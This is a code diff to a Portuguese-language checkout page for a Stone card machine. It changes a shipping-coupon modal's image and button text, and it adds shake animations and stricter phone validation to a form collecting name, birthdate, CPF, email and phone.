@@ -732,13 +732,13 @@ function ensureCouponModalElements() {
             <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
                 <div class="modal-card">
                     <div class="coupon-hero">
-                        <img src="/assets/stone_maquininha.webp" alt="Maquininha Stone com desconto">
+                        <img src="/assets/stone_smart.png" alt="Maquininha Stone com desconto">
                     </div>
-                    <span id="coupon-badge" class="modal-badge">Cupom exclusivo</span>
+                    <span id="coupon-badge" class="modal-badge">CUPOM EXCLUSIVO</span>
                     <h3 id="coupon-title">Desconto liberado no frete</h3>
                     <p id="coupon-message">Você ganhou R$ 5,00 de desconto no frete da Maquininha.</p>
                     <span id="coupon-subtitle" class="coupon-subtitle">Oferta válida agora nesta sessão</span>
-                    <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
+                    <button id="btn-coupon-apply" class="btn-primary" type="button">Resgatar cupom</button>
                 </div>
             </div>
         `;
@@ -970,6 +970,28 @@ function initPersonal() {
     birthdate?.addEventListener('input', () => maskDate(birthdate));
     setupEmailAutocomplete(email);
 
+    function shakeInput(inputEl) {
+        if (!inputEl) return;
+        const group = inputEl.closest('.input-group');
+        if (group) {
+            group.classList.remove('shake-error', 'input-error');
+            void group.offsetWidth; // trigger reflow
+            group.classList.add('shake-error', 'input-error');
+            setTimeout(() => {
+                group.classList.remove('shake-error');
+            }, 500);
+        }
+    }
+
+    [fullname, cpf, email, phone, birthdate].forEach(input => {
+        if (!input) return;
+        input.addEventListener('input', () => {
+            const group = input.closest('.input-group');
+            if (group) group.classList.remove('input-error');
+            clearInlineError(errorBox);
+        });
+    });
+
     form?.addEventListener('submit', (event) => {
         event.preventDefault();
         clearInlineError(errorBox);
@@ -982,26 +1004,32 @@ function initPersonal() {
 
         if (nameValue.length < 3) {
             showInlineError(errorBox, 'Por favor, digite seu nome completo.');
+            shakeInput(fullname);
             return;
         }
 
         if (!isValidDate(birthValue)) {
             showInlineError(errorBox, 'Digite uma data válida (DD/MM/AAAA).');
+            shakeInput(birthdate);
             return;
         }
 
         if (!validateCPF(cpfValue)) {
             showInlineError(errorBox, 'CPF inválido. Verifique os números digitados.');
+            shakeInput(cpf);
             return;
         }
 
         if (!isValidEmail(emailValue)) {
             showInlineError(errorBox, 'Digite um e-mail válido.');
+            shakeInput(email);
             return;
         }
 
-        if (!isValidPhone(phoneValue)) {
-            showInlineError(errorBox, 'Digite um telefone válido com DDD.');
+        const rawPhone = phoneValue.replace(/\D/g, '');
+        if (rawPhone.length < 11 || !isValidPhone(phoneValue)) {
+            showInlineError(errorBox, 'O telefone deve ter DDD + 9 dígitos válidos.');
+            shakeInput(phone);
             return;
         }
 
